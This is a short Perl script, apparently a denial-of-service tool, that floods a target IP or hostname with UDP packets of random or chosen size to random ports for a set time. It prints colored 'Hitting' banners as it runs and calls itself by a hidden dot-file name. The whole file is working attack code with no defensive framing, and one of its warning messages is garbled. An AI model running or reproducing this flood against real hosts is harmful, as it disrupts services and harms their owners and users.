#!/usr/bin/perl
# Copyright 2016 MrReacher LLC @ mrreacher.com
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.


use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw = 0;
our $help = 0;
our $delay= 0;

GetOptions(
"port=i" => \$port,
"size=i" => \$size,
"bandwidth=i" => \$bw,
"time=i" => \$time,
"delay=f"=> \$delay,
"help|?" => \$help);

my ($ip) = @ARGV;

if ($help || !$ip) {
print <<'EOL';
Wrong command, use: ./.cam <ip/dns>
EOL
exit(1);
}

if ($bw && $delay) {
print "WARNING: Package size parameter overrides --ignored\n";
$size = int($bw * $delay / 8);
} elsif ($bw) {
$delay = (8 * $size) / $bw;
}

$size = 256 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Can't resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "\n\033[1;m[\033[31mUDP AMPLIFIED M\033[1;m]\n\033[1;31mSetting up sockets.. ";
sleep 1;
print "\033[1;m[\033[1;33mDONE\033[1;m]\033[1;31m\nConnecting to the host.. ";
sleep 1;
print "\033[1;m[\033[1;33mCONNECTED\033[1;m]\n"; 
sleep 1;
print "\033[1;31mHitting \033[1;33m$ip..\033[1;m" . ($port ? $port : "") . " " . 
($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\n";

die "Invalid packet size: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
usleep(1000 * $delay) if $delay;
}